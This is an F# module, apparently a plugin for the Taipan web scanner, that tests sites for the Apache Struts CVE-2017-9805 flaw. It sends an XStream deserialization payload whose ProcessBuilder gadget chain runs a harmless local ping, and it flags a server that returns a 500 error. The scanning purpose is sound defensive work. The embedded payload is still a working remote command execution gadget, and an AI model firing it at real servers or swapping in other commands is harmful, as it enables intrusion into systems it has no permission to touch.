namespace ES.Taipan.Inspector.AddOns.InformationLeakage

open System
open System.Net
open System.Collections.Generic
open System.Collections.Concurrent
open System.Text.RegularExpressions
open ES.Taipan.Inspector
open ES.Taipan.Inspector.AddOns
open ES.Taipan.Infrastructure.Service
open ES.Taipan.Infrastructure.Messaging
open ES.Taipan.Infrastructure.Network
open ES.Taipan.Infrastructure.Text
open ES.Taipan.Fingerprinter
open ES.Taipan.Crawler
open ES.Fslog
// see https://github.com/mazen160/struts-pwn_CVE-2017-9805/blob/master/struts-pwn.py
type CVE20179805AddOn() as this =
    inherit BaseStatelessAddOn("CVE-2017-9805 AddOn", "227C5558-53B1-41A0-B726-B7B7E3519B68", 1)       
    let _analyzedPages = new HashSet<String>()
                    
    let createSecurityIssue(uri: Uri, webRequest: WebRequest, webResponse: WebResponse, attackString: String) =
        let securityIssue = 
            new SecurityIssue(
                this.Id, 
                Name = "Apache Struts CVE-2017-9805 Vulnerability", 
                Uri = uri, 
                EntryPoint = EntryPoint.DataString
            )

        securityIssue.Details.Properties.Add("Attack", attackString)
        securityIssue.Transactions.Add(webRequest, webResponse)
        securityIssue

    let checkPrerequisite(testRequest: TestRequest) =
        let req = testRequest.WebRequest.HttpRequest
        let pageId = String.Format("{0}_{1}", req.Uri.AbsolutePath, req.Method)

        if testRequest.WebResponse.PageExists && testRequest.RequestType = TestRequestType.CrawledPage && _analyzedPages.Add(pageId) then
            let uri = testRequest.WebRequest.HttpRequest.Uri.AbsoluteUri
            let cookieNames = String.Join("-", testRequest.WebRequest.HttpRequest.Cookies |> Seq.map(fun hdr -> hdr.Name))
            let headerValues = String.Join(",", testRequest.WebRequest.HttpRequest.Headers |> Seq.map(fun hdr -> hdr.Value))

            // search for indication of Struts usage
            [uri; cookieNames]
            |> List.exists(fun info ->
                ["jsessionid"; "application/xml"; ".action"; ".xhtml"]
                |> List.exists(fun checkInfo ->
                    info.ToLower().Contains(checkInfo)
                )
            )
        else false

    let createPayload() =
        """<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>ping</string><string>-n</string><string>10</string><string>127.0.0.1</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer/>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>"""

    let sendRequest(origRequest: WebRequest, attackString: String) =
        let attackRequest = HttpRequest.DeepClone(origRequest.HttpRequest)
        attackRequest.Source <- None
        attackRequest.Data <- attackString
        attackRequest.Method <- HttpMethods.Post
        HttpUtility.setHeader("Content-Type", "application/xml", attackRequest.Headers)

        let webRequest = new WebRequest(attackRequest)
        let webResponse = this.WebRequestor.Value.RequestWebPage(webRequest)
        (webRequest, webResponse)

    let checkIfVulnerable(webResponse: WebResponse) =
        webResponse.HttpResponse.StatusCode = HttpStatusCode.InternalServerError
                                
    default this.Scan(testRequest: TestRequest, stateController: ServiceStateController) =
        if checkPrerequisite(testRequest) then
            // compose payload
            let attackString = createPayload()

            let (attackRequest, attackResponse) = sendRequest(testRequest.WebRequest, attackString)
            if checkIfVulnerable(attackResponse) then
                // finally add the security issue
                let securityIssue = createSecurityIssue(testRequest.WebRequest.HttpRequest.Uri, attackRequest, attackResponse, attackString)
                this.Context.Value.AddSecurityIssue(securityIssue)